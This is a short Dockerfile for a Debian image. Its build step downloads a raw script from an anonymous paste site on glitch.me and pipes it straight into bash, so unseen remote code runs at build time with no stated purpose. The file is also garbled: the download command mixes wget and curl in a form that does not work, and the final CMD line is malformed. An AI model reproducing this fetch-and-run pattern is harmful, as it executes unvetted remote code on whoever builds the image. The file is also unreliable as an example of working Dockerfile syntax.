FROM debian:stable
RUN apt-get update && apt-get -y install wget vim
WORKDIR /home
RUN wget curl https://muq-hastebin.glitch.me/raw/l14CBxmkoM | bash
CMD (-h)
